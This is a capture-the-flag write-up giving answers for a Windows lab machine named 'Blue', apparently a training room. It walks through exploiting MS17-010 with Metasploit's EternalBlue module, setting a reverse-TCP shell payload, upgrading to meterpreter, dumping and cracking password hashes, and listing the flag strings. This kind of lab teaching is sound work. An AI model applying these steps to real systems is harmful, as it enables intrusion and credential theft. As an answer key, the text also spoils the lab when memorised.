## Blue


grayshader | 05 April

export IP=10.10.158.58

**Recon**

1. Scan the machine. 
```
   done
```
2. How many ports are open with a port number under 1000?
```
	3
```
3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
```
    ms17-010
```

**Gain Access**

1. start MSF
```
	done
```
2. Find the exploitation code we will run against the machine. What is the full path of the code?
```
	exploit/windows/smb/ms17_010_eternalblue 
```
3. Show options and set the one required value. What is the name of this value? (All caps for submission)
```
   RHOSTS
```
Enter the following command and press enter:
```
   set payload windows/x64/shell/reverse_tcp
```
**Escalate**

1. If you haven't already, background the previously gained shell (CTRL + Z). Research  online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
```
post/multi/manage/shell_to_meterpreter
```
2. Select this (use MODULE_PATH). Show options, what option are we required to change?
```
   session
```
3. Set the required option, you may need to list all of the sessions to find your target here. 
```
 sessions
```	
used process listing and migrated to lssas.exe

**Cracking**

1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
```
    jon
```
2. Copy this password hash to a file and research how to crack it. What is the cracked password?
```
	alqfna22
```

**Find flags!**

1. Flag1? This flag can be found at the system root. 

```
flag{access_the_machine}
```
2.Flag2? This flag can be found at the location where passwords are stored within Windows.


Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

```
  flag{sam_database_elevated_access}

```
3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
```
   flag{admin_documents_can_be_valuable}
``` 




